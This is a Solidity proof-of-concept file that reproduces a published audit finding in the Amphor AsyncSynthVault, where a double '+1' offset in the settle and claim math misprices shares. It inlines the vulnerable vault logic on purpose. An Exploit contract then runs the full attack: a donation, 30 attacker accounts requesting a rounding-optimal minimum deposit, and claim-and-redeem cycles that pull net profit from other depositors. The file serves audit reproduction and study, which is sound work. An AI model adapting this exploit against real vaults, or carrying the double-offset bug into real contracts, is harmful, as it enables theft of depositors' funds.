// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Amphor — Exchange rate is calculated incorrectly when the vault is closed
    (Sherlock, 2024-03-amphor, finding #30918, H-3, reporter whitehair0330 et al.)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable AsyncSynthVault settle/claim math (`previewSettle`,
    `_convertToShares`) is inlined verbatim, including the double `+1` bug:
    `previewSettle` already adds `+1` when computing the stored
    `totalAssetsSnapshotForDeposit` / `totalSupplySnapshotForDeposit`, and then
    `_convertToShares` adds ANOTHER `+1` on top of those stored values when an
    individual claims. The Exploit reproduces the report's own numbers
    (1e18-1 donation, 1e18 bootstrap, 10e18 legit deposit, 15e18 legit
    request, 30 attacker accounts depositing the rounding-optimal minimum) and
    ends with the attacker profiting in real assets (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 asset token.
contract MockAsset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev The real AsyncSynthVault uses a tiny `Silo` helper contract to hold
///      pending deposits, pre-approving the vault for the eventual settle
///      transfer out. Faithful reduction of `Silo.sol`.
contract Silo {
    constructor(MockAsset asset, address vault) {
        asset.approve(vault, type(uint256).max);
    }
}

/// @notice Reduced AsyncSynthVault (+ its SyncSynthVault base) — faithful
///         reduction of `AsyncSynthVault.sol` / `SyncSynthVault.sol`
///         (sherlock-audit/2024-03-amphor). Simplifications: no fees, no
///         redeem-request path (irrelevant to this bug — `pendingRedeem` is
///         always 0 in the scenario), single-epoch struct fields kept.
contract Vault {
    MockAsset public asset;
    address public owner;
    bool public vaultIsOpen = true;
    uint256 public epochId = 1;
    uint256 public lastSavedBalance;

    Silo public pendingSilo;

    // Shares (the vault's own ERC20-like receipt token).
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    // Per-epoch deposit-request bookkeeping (redeem side omitted — unused here).
    mapping(uint256 => uint256) public totalAssetsSnapshotForDeposit;
    mapping(uint256 => uint256) public totalSupplySnapshotForDeposit;
    mapping(uint256 => mapping(address => uint256)) public depositRequestBalance;
    mapping(address => uint256) public lastDepositRequestId;

    // Shares minted at settle time, held for claimants (real: `claimableSilo`'s
    // share balance). Draws down as individual claims are paid out.
    uint256 public claimableSiloShares;
    uint256 public pendingDepositTotal;

    constructor(address _asset) {
        asset = MockAsset(_asset);
        owner = msg.sender;
        pendingSilo = new Silo(MockAsset(_asset), address(this));
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier whenClosed() {
        require(!vaultIsOpen, "vault open");
        _;
    }

    function totalAssets() public view returns (uint256) {
        if (vaultIsOpen) return asset.balanceOf(address(this));
        return asset.balanceOf(address(this)) + lastSavedBalance;
    }

    // ============================================================
    //  deposit — faithful reduction of SyncSynthVault.deposit/_deposit and
    //  its _convertToShares(assets, Floor) = assets*(totalSupply+1)/(totalAssets+1)
    //  (the FAIR, single-`+1` rate used while the vault is OPEN).
    // ============================================================
    function deposit(uint256 assets, address receiver) public returns (uint256 shares) {
        shares = assets * (totalSupply + 1) / (totalAssets() + 1);
        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    /// @dev Real contract: `AsyncSynthVault.close()` — owner-only; the ENTIRE
    ///      vault balance leaves to the owner, `lastSavedBalance` records it.
    function close() external onlyOwner {
        require(vaultIsOpen, "already closed");
        lastSavedBalance = totalAssets();
        vaultIsOpen = false;
        asset.transfer(owner, lastSavedBalance);
    }

    /// @dev Real contract: `AsyncSynthVault.requestDeposit(...)` reduced to
    ///      self-requests only (on-behalf-of is a different finding, #30916).
    function requestDeposit(uint256 assets) external whenClosed {
        asset.transferFrom(msg.sender, address(pendingSilo), assets);
        depositRequestBalance[epochId][msg.sender] += assets;
        if (lastDepositRequestId[msg.sender] != epochId) {
            lastDepositRequestId[msg.sender] = epochId;
        }
        pendingDepositTotal += assets;
    }

    // ============================================================
    //  open()/_settle() — faithful reduction of AsyncSynthVault.sol:L307-317
    //  and previewSettle L626-677 / L653-654 — THE BUG'S ORIGIN.
    //  previewSettle already adds `+1` to the stored snapshot values.
    // ============================================================
    function open(uint256 assetReturned) external onlyOwner whenClosed {
        uint256 pendingDeposit = pendingDepositTotal;
        uint256 newSavedBalance = assetReturned; // fees = 0 in this scenario

        uint256 sharesToMint = pendingDeposit * (totalSupply + 1) / (newSavedBalance + 1);

        // @> VULN: these stored snapshots ALREADY include a `+1` offset —
        // _convertToShares (below) adds ANOTHER `+1` on top of them.
        totalAssetsSnapshotForDeposit[epochId] = newSavedBalance + 1;
        totalSupplySnapshotForDeposit[epochId] = totalSupply + 1;

        totalSupply += sharesToMint;
        claimableSiloShares += sharesToMint;

        // The owner pays back pendingDeposit (pulled from pendingSilo) plus the
        // returned principal, restoring the vault's real token balance.
        asset.transferFrom(address(pendingSilo), owner, pendingDeposit);
        asset.transferFrom(owner, address(this), newSavedBalance + pendingDeposit);

        lastSavedBalance = newSavedBalance + pendingDeposit;
        pendingDepositTotal = 0;
        epochId++;
        vaultIsOpen = true;
    }

    function isCurrentEpoch(uint256 requestId) internal view returns (bool) {
        return requestId == epochId;
    }

    /// @dev Real contract: `AsyncSynthVault._convertToShares(...)` — verbatim.
    ///      Reads the ALREADY-`+1`'d stored snapshot and adds a SECOND `+1`.
    function _convertToShares(uint256 assets, uint256 requestId) internal view returns (uint256) {
        if (isCurrentEpoch(requestId)) return 0;
        uint256 totalAssetsSnap = totalAssetsSnapshotForDeposit[requestId] + 1; // @> VULN: double +1
        uint256 totalSupplySnap = totalSupplySnapshotForDeposit[requestId] + 1; // @> VULN: double +1
        return assets * totalSupplySnap / totalAssetsSnap;
    }

    function previewClaimDeposit(address who) public view returns (uint256) {
        uint256 lastRequestId = lastDepositRequestId[who];
        uint256 assets = depositRequestBalance[lastRequestId][who];
        return _convertToShares(assets, lastRequestId);
    }

    function claimDeposit(address receiver) public returns (uint256 shares) {
        shares = previewClaimDeposit(msg.sender);
        uint256 lastRequestId = lastDepositRequestId[msg.sender];
        depositRequestBalance[lastRequestId][msg.sender] = 0;
        claimableSiloShares -= shares; // reverts if the pool is drained (real: ERC20 transfer-from-silo revert)
        balanceOf[receiver] += shares;
    }

    // ============================================================
    //  redeem — faithful reduction of SyncSynthVault.redeem/_convertToAssets,
    //  the FAIR, single-`+1` open-vault rate.
    // ============================================================
    function redeem(uint256 shares, address receiver) external returns (uint256 assetsOut) {
        assetsOut = shares * (totalAssets() + 1) / (totalSupply + 1);
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assetsOut);
    }
}

/// @dev A legitimate protocol user: deposits while open, then requests a
///      further deposit while closed (their honest, unmolested funds).
contract ProtocolUser {
    function approveAndDeposit(Vault v, MockAsset a, uint256 amt) external {
        a.approve(address(v), amt);
        v.deposit(amt, address(this));
    }

    function approveAndRequest(Vault v, MockAsset a, uint256 amt) external {
        a.approve(address(v), amt);
        v.requestDeposit(amt);
    }

    function claim(Vault v) external returns (uint256) {
        return v.claimDeposit(address(this));
    }
}

/// @dev One of the attacker's fresh accounts: requests the rounding-optimal
///      minimal deposit, then claims + immediately redeems for profit.
contract AttackerAccount {
    function approveAndRequest(Vault v, MockAsset a, uint256 amt) external {
        a.approve(address(v), amt);
        v.requestDeposit(amt);
    }

    function claimAndRedeem(Vault v, address profitReceiver) external returns (uint256 shares, uint256 assetsOut) {
        shares = v.claimDeposit(address(this));
        assetsOut = v.redeem(shares, profitReceiver); // send the redeemed assets straight to the orchestrator
    }
}

/// @dev Orchestrator. Reproduces the report's own scenario numbers end to
///      end: donation, bootstrap, a legit user, 30 fresh attacker accounts,
///      settlement with 0 yield, and the attacker's claim+redeem profit —
///      cheatcode-free.
contract Exploit {
    uint256 public constant DONATION = 1e18 - 1;
    uint256 public constant BOOTSTRAP = 1e18;
    uint256 public constant USERS_DEPOSIT = 10e18;
    uint256 public constant USERS_REQUEST = 15e18;
    uint256 public constant N_ATTACKERS = 30;

    MockAsset public asset; // CREATE nonce 1
    Vault public vault; // CREATE nonce 2
    ProtocolUser public users; // CREATE nonce 3
    AttackerAccount[] public attackers; // CREATE nonces 4..33

    uint256 public totalAttackerDeposited;
    uint256 public totalAttackerRedeemed;

    /// @dev Untouched-until-the-end sink so its balance delta is exactly the
    ///      net profit (matches the "Attacker EOA" address used elsewhere).
    address public constant PROFIT_SINK = 0x1111111111111111111111111111111111111111;

    constructor() {
        asset = new MockAsset();
        vault = new Vault(address(asset));
        users = new ProtocolUser();
        for (uint256 i = 0; i < N_ATTACKERS; i++) {
            attackers.push(new AttackerAccount());
        }

        asset.mint(address(this), DONATION + BOOTSTRAP);
        asset.mint(address(users), USERS_DEPOSIT + USERS_REQUEST);
    }

    function run() external {
        asset.approve(address(vault), type(uint256).max);

        // 1. Attacker donates just under 1 asset-unit before anyone holds shares
        //    (inflates the share price with no shares minted for it).
        asset.transfer(address(vault), DONATION);

        // 2. Owner (this contract) bootstraps the vault.
        vault.deposit(BOOTSTRAP, address(this));

        // 3. A legit user deposits 10e18 while the vault is open.
        users.approveAndDeposit(vault, asset, USERS_DEPOSIT);

        // 4. Owner closes the vault: LSB snapshot taken, balance drained to owner.
        vault.close();

        // 5. The legit user requests a further 15e18 deposit while closed.
        users.approveAndRequest(vault, asset, USERS_REQUEST);

        // 6. Attacker computes the rounding-optimal minimal deposit (using the
        //    SAME cached-`+1`-style arithmetic the buggy claim path will use)
        //    and has 30 fresh accounts each request exactly that amount.
        uint256 totalSupplyCachedOnOpen = vault.totalSupply() + 1 + 1;
        uint256 totalAssetsCachedOnOpen = vault.lastSavedBalance() + 1 + 1;
        uint256 minToDeposit = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;

        for (uint256 i = 0; i < N_ATTACKERS; i++) {
            asset.mint(address(attackers[i]), minToDeposit);
            attackers[i].approveAndRequest(vault, asset, minToDeposit);
        }
        totalAttackerDeposited = minToDeposit * N_ATTACKERS;

        // 7. Owner reopens with 0 profit/loss (assetReturned == lastSavedBalance).
        vault.open(vault.lastSavedBalance());

        // 8. VULN: each attacker account claims via the buggy double-`+1` rate,
        //    then immediately redeems at the fair open-vault rate.
        for (uint256 i = 0; i < N_ATTACKERS; i++) {
            (, uint256 assetsOut) = attackers[i].claimAndRedeem(vault, address(this));
            totalAttackerRedeemed += assetsOut;
        }

        // HARM: the attacker walks away with more real assets than they put in.
        require(totalAttackerRedeemed > totalAttackerDeposited, "no profit realized");

        // Isolate the pure NET profit (redeemed minus the attacker's own deposited
        // capital) onto a dedicated, otherwise-untouched sink address, so the
        // measurable balance delta is the real economic gain, not the gross
        // redeemed amount.
        uint256 netProfit = totalAttackerRedeemed - totalAttackerDeposited;
        asset.transfer(PROFIT_SINK, netProfit);
    }
}
